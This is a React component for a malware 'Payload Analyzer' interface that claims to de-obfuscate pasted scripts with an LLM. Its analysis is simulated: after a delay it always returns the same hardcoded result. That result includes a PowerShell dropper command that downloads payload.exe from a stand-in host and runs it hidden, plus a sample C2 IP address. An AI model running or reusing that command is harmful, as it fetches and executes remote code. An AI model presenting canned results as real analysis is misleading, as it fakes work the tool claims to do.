import React, { useState } from 'react';
import { Terminal, Code, Cpu, RefreshCw, FileCode, Search, ShieldAlert } from 'lucide-react';

export const PayloadAnalyzer: React.FC = () => {
  const [payload, setPayload] = useState('');
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [results, setResults] = useState<any>(null);

  const handleAnalyze = () => {
    if (!payload.trim()) return;
    
    setIsAnalyzing(true);
    // Simulate LLM processing
    setTimeout(() => {
      setResults({
        language: 'PowerShell',
        obfuscation: 'Base64 + Gzip + Variable Renaming',
        intent: 'Download and Execute (Dropper)',
        iocs: [
          { type: 'IPv4', value: '185.158.248.10', context: 'C2 Server' },
          { type: 'Domain', value: 'update-windows-service.com', context: 'Payload Host' },
          { type: 'File', value: 'payload.exe', context: 'Dropped Executable' }
        ],
        deobfuscatedCode: `Invoke-WebRequest -Uri "http://update-windows-service.com/payload.exe" -OutFile "$env:TEMP\\payload.exe"\nStart-Process "$env:TEMP\\payload.exe" -WindowStyle Hidden`,
        explanation: 'This script is a common PowerShell dropper. It reaches out to a remote server to download an executable named "payload.exe" into the user\'s TEMP directory, and then executes it silently in the background.'
      });
      setIsAnalyzing(false);
    }, 2000);
  };

  const decodeBase64 = () => {
    try {
      setPayload(atob(payload));
    } catch (e) {
      alert('Invalid Base64 string');
    }
  };

  return (
    <div className="flex flex-col gap-6 animate-fade-in h-full">
      <div className="flex justify-between items-center">
        <div>
          <h1 className="text-2xl font-bold flex items-center gap-3">
            <Terminal className="text-purple-400" size={28} /> Payload Analyzer (LLM De-obfuscator)
          </h1>
          <p className="text-muted text-sm mt-1">Paste obfuscated scripts or payloads to automatically de-obfuscate and extract intent.</p>
        </div>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-2 gap-6 flex-1 min-h-0">
        {/* Input Area */}
        <div className="glass-panel flex flex-col h-full border-white/10">
          <div className="p-4 border-b border-white/10 flex justify-between items-center">
            <div className="flex items-center gap-2 font-bold text-sm text-slate-300">
              <Code size={16} /> Raw Payload Input
            </div>
            <div className="flex gap-2">
              <button onClick={decodeBase64} className="px-3 py-1 bg-white/5 hover:bg-white/10 rounded border border-white/10 text-xs transition-colors">
                Decode Base64
              </button>
              <button 
                onClick={handleAnalyze}
                disabled={isAnalyzing || !payload.trim()}
                className="px-4 py-1 bg-purple-500/20 hover:bg-purple-500/30 text-purple-400 rounded border border-purple-500/30 text-xs font-bold transition-all disabled:opacity-50 flex items-center gap-2"
              >
                {isAnalyzing ? <RefreshCw size={12} className="animate-spin" /> : <Cpu size={12} />}
                Analyze with Oracle
              </button>
            </div>
          </div>
          <div className="flex-1 p-0 relative w-full">
            <textarea
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              placeholder="Paste Base64, Hex, PowerShell, Javascript, or raw payload here..."
              className="absolute inset-0 w-full h-full bg-slate-950/50 p-4 font-mono text-xs text-slate-400 resize-none outline-none border-none custom-scrollbar"
            />
          </div>
        </div>

        {/* Output Area */}
        <div className="glass-panel flex flex-col h-full border-l-4 border-l-purple-500">
          <div className="p-4 border-b border-white/10 flex justify-between items-center">
            <div className="flex items-center gap-2 font-bold text-sm text-purple-400">
              <Search size={16} /> Oracle AI Analysis
            </div>
          </div>
          
          <div className="flex-1 overflow-y-auto p-6 custom-scrollbar flex flex-col gap-6">
            {!results && !isAnalyzing && (
              <div className="flex-1 flex flex-col items-center justify-center text-muted opacity-50">
                <Cpu size={48} className="mb-4" />
                <p>Awaiting payload analysis...</p>
              </div>
            )}
            
            {isAnalyzing && (
              <div className="flex-1 flex flex-col items-center justify-center text-purple-400 animate-pulse">
                <RefreshCw size={48} className="mb-4 animate-spin" />
                <p>Decrypting layers and analyzing AST...</p>
              </div>
            )}

            {results && !isAnalyzing && (
              <>
                <div className="grid grid-cols-2 gap-4">
                  <div className="p-4 bg-white/5 border border-white/10 rounded-lg">
                    <div className="text-[10px] text-muted uppercase tracking-widest mb-1">Detected Language</div>
                    <div className="font-bold text-white flex items-center gap-2">
                      <FileCode size={14} className="text-secondary" /> {results.language}
                    </div>
                  </div>
                  <div className="p-4 bg-white/5 border border-white/10 rounded-lg">
                    <div className="text-[10px] text-muted uppercase tracking-widest mb-1">Primary Intent</div>
                    <div className="font-bold text-danger flex items-center gap-2">
                      <ShieldAlert size={14} /> {results.intent}
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-purple-500/10 border border-purple-500/20 rounded-lg">
                  <div className="text-[10px] text-purple-400 font-bold uppercase tracking-widest mb-2">AI Explanation</div>
                  <p className="text-sm text-slate-300 leading-relaxed">{results.explanation}</p>
                </div>

                <div>
                  <div className="text-[10px] text-muted uppercase tracking-widest mb-2 px-1">Extracted Indicators (IoCs)</div>
                  <div className="flex flex-col gap-2">
                    {results.iocs.map((ioc: any, i: number) => (
                      <div key={i} className="flex items-center justify-between p-3 bg-white/5 border border-white/10 rounded-lg">
                        <div className="flex items-center gap-3">
                          <span className="badge badge-warning text-[10px]">{ioc.type}</span>
                          <span className="font-mono text-sm text-white">{ioc.value}</span>
                        </div>
                        <span className="text-xs text-muted">{ioc.context}</span>
                      </div>
                    ))}
                  </div>
                </div>

                <div>
                  <div className="text-[10px] text-muted uppercase tracking-widest mb-2 px-1 flex justify-between items-center">
                    <span>De-obfuscated Code</span>
                  </div>
                  <pre className="p-4 bg-slate-950/80 rounded-lg border border-white/10 text-xs font-mono text-green-400 overflow-x-auto whitespace-pre-wrap">
                    {results.deobfuscatedCode}
                  </pre>
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
